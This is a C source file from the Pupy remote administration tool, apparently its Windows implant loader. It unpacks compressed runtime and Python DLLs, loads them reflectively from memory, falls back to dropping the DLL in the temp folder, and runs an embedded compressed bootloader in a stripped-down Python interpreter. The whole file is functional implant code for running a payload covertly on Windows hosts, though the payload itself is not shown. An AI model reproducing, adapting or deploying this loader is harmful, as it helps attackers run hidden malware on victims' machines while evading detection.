/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "pupy_load.h"
#include "Python-dynload.h"
#include "actctx.h"
#include "resource_python_manifest.c"
#include "base_inject.h"
#include "debug.h"

#include "msvcr90.c"
#include "python27.c"
#include "bootloader.c"

#include "lzmaunpack.c"

#include "revision.h"

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

CRITICAL_SECTION csInit; // protecting our init code

// Simple trick to get the current pupy arch
#ifdef _WIN64
	const DWORD dwPupyArch = PROCESS_ARCH_X64;
#else
	const DWORD dwPupyArch = PROCESS_ARCH_X86;
#endif


DWORD WINAPI mainThread(LPVOID lpArg)
{

	int rc = 0;
	PyObject *m=NULL, *d=NULL, *seq=NULL;
	PyObject *mod;
	char * ppath;
	FILE * f;
	char tmp_python_dll_path[MAX_PATH];
	char tmp_manifest_path[MAX_PATH];
	char tmp_path[MAX_PATH];
	ULONG_PTR cookie = 0;
	PyGILState_STATE restore_state;

	dfprint(stderr, "TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

	if(!GetModuleHandle("msvcr90.dll")) {
		size_t msvcr90_size;
		void *msvcr90 = lzmaunpack(
			msvcr90_c_start,
			msvcr90_c_size,
			&msvcr90_size
		);

		int r = _load_msvcr90(msvcr90);
		lzmafree(msvcr90, msvcr90_size);

		dfprint(stderr,"loading msvcr90.dll: %d\n", r);
	}
	else{
		dfprint(stderr,"msvcr90.dll already loaded\n");
	}

	GetTempPath(MAX_PATH, tmp_path);
	//InitializeCriticalSection(&csInit);

	if(!Py_IsInitialized)
	{
		int res=0;
		if(GetModuleHandle("python27.dll")){
			HANDLE hp;
			dfprint(stderr,"python27.dll is already loaded\n");
			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
		}
		else{
			size_t python27_size;
			void *python27 = lzmaunpack(python27_c_start, python27_c_size, &python27_size);
			int res = _load_python("python27.dll", python27);
			lzmafree(python27, python27_size);
			if(!res) {
				dfprint(stderr,"loading python27.dll from memory failed\n");

				//if loading from memory fail, we write dll on disk
				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);

				f=fopen(tmp_python_dll_path,"wb");
				res=fwrite(python27_c_start, sizeof(char), python27_c_size, f);
				fclose(f);

				if(!_load_python(tmp_python_dll_path, NULL)){
					if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
						dfprint(stderr,"could not load python dll\n");
					}
				}
			}
			dfprint(stderr,"python interpreter loaded\n");
		}
	}
	dfprint(stderr,"calling PyEval_InitThreads() ...\n");
	PyEval_InitThreads();
	dfprint(stderr,"PyEval_InitThreads() called\n");
	if(!Py_IsInitialized()){
		ppath = Py_GetPath();
		strcpy(ppath, "\x00");

		Py_IgnoreEnvironmentFlag = 1;
		Py_NoSiteFlag = 1;
		Py_NoUserSiteDirectory = 1;
		Py_OptimizeFlag = 2;
		Py_DontWriteBytecodeFlag = 1;

		Py_Initialize();

		dfprint(stderr,"Py_Initialize()\n");
		PySys_SetObject("frozen", PyBool_FromLong(1));
	}
	restore_state=PyGILState_Ensure();

	init_memimporter();
	dfprint(stderr,"init_memimporter()\n");
	initpupy();
	dfprint(stderr,"initpupy()\n");

	/* We execute then in the context of '__main__' */
	dfprint(stderr,"starting evaluating python code ...\n");
	m = PyImport_AddModule("__main__");
	if (m) d = PyModule_GetDict(m);
	if (d) seq = PyObject_lzmaunpack(
		bootloader_c_start,
		bootloader_c_size
	);

	if (seq) {
		PyObject *discard = PyEval_EvalCode((PyCodeObject *)seq, d, d);
		if (!discard) {
			PyErr_Print();
			rc = 255;
		}
		Py_XDECREF(discard);
	}

	Py_XDECREF(seq);
	PyGILState_Release(restore_state);
	Py_Finalize();

	//DeleteCriticalSection(&csInit);
	return 0;
}
